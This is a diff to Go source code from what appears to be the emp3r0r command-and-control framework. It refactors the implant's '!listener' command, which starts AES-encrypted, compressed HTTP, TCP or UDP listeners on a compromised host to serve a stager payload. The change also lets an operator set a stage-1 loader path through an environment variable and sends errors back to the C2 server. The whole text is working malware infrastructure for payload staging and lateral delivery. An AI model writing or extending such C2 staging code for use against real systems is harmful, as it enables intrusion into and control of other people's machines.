@@ -277,21 +277,33 @@ func decodeInvocation(b64 string) (def.ResolvedInvocation, error) {
 	return inv, nil
 }
 
-// runListener implements !listener --listener <listener> --port <port> --payload <payload> --compression <on/off> --passphrase <passphrase>
+// runListener implements !listener --type <http/tcp/udp> --port <port> --stager <path> --key <key> [--loader <path>]
 func runListener(cmd *cobra.Command, args []string) {
-	listenerType, _ := cmd.Flags().GetString("listener")
+	listenerType, _ := cmd.Flags().GetString("type")
 	port, _ := cmd.Flags().GetString("port")
-	payload, _ := cmd.Flags().GetString("payload")
-	compression, _ := cmd.Flags().GetString("compression")
-	passphrase, _ := cmd.Flags().GetString("passphrase")
-	if payload == "" {
-		c2transport.NotifyC2(cmd, "Error: payload not specified\n")
+	stagerPath, _ := cmd.Flags().GetString("stager")
+	keyStr, _ := cmd.Flags().GetString("key")
+	loaderPath, _ := cmd.Flags().GetString("loader")
+
+	if stagerPath == "" {
+		c2transport.NotifyC2(cmd, "Error: stager not specified\n")
 		return
 	}
+
+	if loaderPath != "" {
+		if err := os.Setenv("EMP3R0R_STAGE1_LOADER", loaderPath); err != nil {
+			c2transport.NotifyC2(cmd, "Error: failed to set loader env: %v\n", err)
+			return
+		}
+	} else {
+		_ = os.Unsetenv("EMP3R0R_STAGE1_LOADER")
+	}
+
 	logging.Infof("Got listener request: %v", args)
 	errChan := make(chan error)
-	switch listenerType {
-	case "http_aes_compressed":
+
+	switch strings.ToLower(strings.TrimSpace(listenerType)) {
+	case "http":
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
@@ -299,9 +311,9 @@ func runListener(cmd *cobra.Command, args []string) {
 					errChan <- fmt.Errorf("Listener panic: %v", r)
 				}
 			}()
-			errChan <- listener.HTTPAESCompressedListener(payload, port, passphrase, compression == "on")
+			errChan <- listener.HTTPAESCompressedListener(stagerPath, port, keyStr, true)
 		}()
-	case "tcp_aes_compressed":
+	case "tcp":
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
@@ -309,9 +321,9 @@ func runListener(cmd *cobra.Command, args []string) {
 					errChan <- fmt.Errorf("Listener panic: %v", r)
 				}
 			}()
-			errChan <- listener.TCPAESCompressedListener(payload, port, passphrase, compression == "on")
+			errChan <- listener.TCPAESCompressedListener(stagerPath, port, keyStr, true)
 		}()
-	case "udp_aes_compressed":
+	case "udp":
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
@@ -319,10 +331,10 @@ func runListener(cmd *cobra.Command, args []string) {
 					errChan <- fmt.Errorf("Listener panic: %v", r)
 				}
 			}()
-			errChan <- listener.UDPAESCompressedListener(payload, port, passphrase, compression == "on")
+			errChan <- listener.UDPAESCompressedListener(stagerPath, port, keyStr, true)
 		}()
 	default:
-		c2transport.NotifyC2(cmd, "Error: unknown listener type '%s'\n", listenerType)
+		c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
 		return
 	}
 	select {
